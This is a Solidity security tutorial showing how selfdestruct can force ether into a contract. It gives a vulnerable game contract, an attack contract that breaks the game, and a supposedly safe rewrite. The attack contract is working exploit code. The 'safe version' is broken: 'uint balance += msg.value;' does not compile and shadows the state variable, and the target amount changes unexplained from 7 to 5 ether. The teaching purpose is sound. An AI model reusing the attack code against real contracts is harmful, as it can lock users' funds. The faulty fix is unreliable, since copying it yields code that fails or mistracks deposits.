## Forcefully sending ether to a smart contract with self destruct

The selfdestruct(address) function removes all bytecode from the contract address, deletes the contract from the blockchain and sends all ether stored to the specified address. If this specified address is also a contract, no functions (including the fallback) get called.

In other words, an attacker can create a contract with a selfdestruct() function, send ether to it, call selfdestruct(target) and force ether to be sent to a target.

# Let's see how this attack can look like. We create a simple smart contract.
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract EtherGame {
    uint public targetAmount = 7 ether;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        uint balance = address(this).balance;
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    EtherGame etherGame;

    constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function attack() public payable {
        // You can simply break the game by sending ether so that
        // the game balance >= 7 ether

        // cast address to payable
        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }
}

In the above example 7 players deposits 1 eth each into etherGame contract, the last player to deposit claims all the 7 ETH. 
The attacker can send  5 ether to the game contract using selfdestuct. This will break the game and No one can become the winner.
The Attack will force the balance of EtherGame to be greater than or equal to 7 ether.
Now no one can deposit and the winner cannot be set.

# How to prevent forcefully sending ether
This vulnerability arises from the misuse of this.balance. Your contract should avoid being dependent on the exact values of the balance of the contract because it can be artificially manipulated.

If exact values of deposited ether are required, a self-defined variable should be used that gets incremented in payable functions, to safely track the deposited ether. This can prevent your contract to be influenced by the forced ether sent via a selfdestruct() call.

# Let's see how the safe version of the contract looks like.
contract EtherGame {
    uint public targetAmount = 5 ether;
    address public winner;
    uint public balance;

    function play() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        uint balance += msg.value;
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}
